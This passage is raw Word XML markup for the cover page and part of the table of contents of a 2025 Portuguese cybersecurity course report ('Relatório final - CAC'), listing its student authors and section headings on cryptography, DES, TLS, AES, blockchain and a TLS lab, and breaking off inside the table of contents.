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1A8DF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2E984775" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251672576" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6FBF9B56" wp14:editId="24B716DF">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1496058</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>5774051</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4255773" cy="1845314"/>
                <wp:effectExtent l="0" t="0" r="11427" b="2536"/>
                <wp:wrapSquare wrapText="bothSides"/>
                <wp:docPr id="567501091" name="Caixa de Texto 126"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4255773" cy="1845314"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln>
                          <a:noFill/>
                          <a:prstDash/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="0BD98B4B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:pStyle w:val="SemEspaamento"/>
                              <w:spacing w:before="40" w:after="560" w:line="216" w:lineRule="auto"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:color w:val="4472C4"/>
                                <w:sz w:val="72"/>
                                <w:szCs w:val="72"/>
                              </w:rPr>
                              <w:t>Relatório final - CAC</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33C17292" w14:textId="26A0CA5D" w:rsidR="004253CC" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:pStyle w:val="SemEspaamento"/>
                              <w:spacing w:before="80" w:after="40"/>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>rodrigo baltazar, 2024142                                                                Rafael baptista, 2024</w:t>
                            </w:r>
                            <w:r w:rsidR="00224B0C">
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>134</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">                                                                   José Couto, 2024</w:t>
                            </w:r>
                            <w:r w:rsidR="00224B0C">
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">026  </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">                                                                            Samuel Rocha, 2024</w:t>
                            </w:r>
                            <w:r w:rsidR="00224B0C">
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>127</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">                                                                                Davide Ferreira,2024</w:t>
                            </w:r>
                            <w:r w:rsidR="00AF6215">
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>154</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="517BB7E9" w14:textId="5DB31415" w:rsidR="00224B0C" w:rsidRDefault="00224B0C">
                            <w:pPr>
                              <w:pStyle w:val="SemEspaamento"/>
                              <w:spacing w:before="80" w:after="40"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:caps/>
                                <w:color w:val="5B9BD5"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>2º Cibersegurança</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0" compatLnSpc="1">
                        <a:spAutoFit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shapetype w14:anchorId="6FBF9B56" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="Caixa de Texto 126" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:117.8pt;margin-top:454.65pt;width:335.1pt;height:145.3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" filled="f" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="0BD98B4B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:pStyle w:val="SemEspaamento"/>
                        <w:spacing w:before="40" w:after="560" w:line="216" w:lineRule="auto"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:color w:val="4472C4"/>
                          <w:sz w:val="72"/>
                          <w:szCs w:val="72"/>
                        </w:rPr>
                        <w:t>Relatório final - CAC</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33C17292" w14:textId="26A0CA5D" w:rsidR="004253CC" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:pStyle w:val="SemEspaamento"/>
                        <w:spacing w:before="80" w:after="40"/>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>rodrigo baltazar, 2024142                                                                Rafael baptista, 2024</w:t>
                      </w:r>
                      <w:r w:rsidR="00224B0C">
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>134</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">                                                                   José Couto, 2024</w:t>
                      </w:r>
                      <w:r w:rsidR="00224B0C">
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">026  </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">                                                                            Samuel Rocha, 2024</w:t>
                      </w:r>
                      <w:r w:rsidR="00224B0C">
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>127</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">                                                                                Davide Ferreira,2024</w:t>
                      </w:r>
                      <w:r w:rsidR="00AF6215">
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>154</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="517BB7E9" w14:textId="5DB31415" w:rsidR="00224B0C" w:rsidRDefault="00224B0C">
                      <w:pPr>
                        <w:pStyle w:val="SemEspaamento"/>
                        <w:spacing w:before="80" w:after="40"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:caps/>
                          <w:color w:val="5B9BD5"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>2º Cibersegurança</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="page" anchory="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251671552" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1EF540C1" wp14:editId="41C1FA7D">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>5905496</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>245745</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="574672" cy="1042672"/>
                <wp:effectExtent l="0" t="0" r="0" b="5078"/>
                <wp:wrapNone/>
                <wp:docPr id="1303860343" name="Retângulo 128"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="574672" cy="1042672"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="4472C4"/>
                        </a:solidFill>
                        <a:ln cap="flat">
                          <a:noFill/>
                          <a:prstDash val="solid"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="1EAB91FA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:pStyle w:val="SemEspaamento"/>
                              <w:jc w:val="right"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="Fontepargpadro"/>
                                <w:color w:val="FFFFFF"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>2025</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr vert="horz" wrap="square" lIns="45720" tIns="45720" rIns="45720" bIns="45720" anchor="b" anchorCtr="0" compatLnSpc="1">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:rect w14:anchorId="1EF540C1" id="Retângulo 128" o:spid="_x0000_s1027" style="position:absolute;margin-left:465pt;margin-top:19.35pt;width:45.25pt;height:82.1pt;z-index:2516715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" fillcolor="#4472c4" stroked="f">
                <v:textbox inset="3.6pt,,3.6pt">
                  <w:txbxContent>
                    <w:p w14:paraId="1EAB91FA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:pStyle w:val="SemEspaamento"/>
                        <w:jc w:val="right"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="Fontepargpadro"/>
                          <w:color w:val="FFFFFF"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>2025</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="page" anchory="page"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FA222E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Calibri" w:hAnsi="Arial" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:id w:val="-451477260"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="1784D26D" w14:textId="20575022" w:rsidR="00363733" w:rsidRDefault="00363733">
          <w:pPr>
            <w:pStyle w:val="Cabealhodondice"/>
          </w:pPr>
          <w:r>
            <w:t>Conteúdo</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1A72A8C0" w14:textId="14277D03" w:rsidR="00842992" w:rsidRDefault="00363733">
          <w:pPr>
            <w:pStyle w:val="ndice1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8494"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="pt-PT"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc213881889" w:history="1">
            <w:r w:rsidR="00842992" w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introdução</w:t>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881889 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00842992">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3BC09382" w14:textId="23A04AC5"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Criptografia</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881890 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="65E7C02F" w14:textId="4681E233"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>DES</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881891 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="06C4C2BD" w14:textId="5854B3FE"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>TLS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881892 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="456F8335" w14:textId="7F43858B"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protocolo AES - Advanced Encryption Standard</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881893 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="62096B15" w14:textId="7A9CE71A"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Blockchain</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881894 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1E5DF4E0" w14:textId="64823ED0"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Transport Layer Security (TLS) Lab - Resolução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881895 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1587EC9A" w14:textId="5C50017F"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introdução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881896 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1A8C7E67" w14:textId="7BBACE7D"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Arquitetura da rede</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881897 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1ADA0093" w14:textId="6D1DC68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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Componentes Principais</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
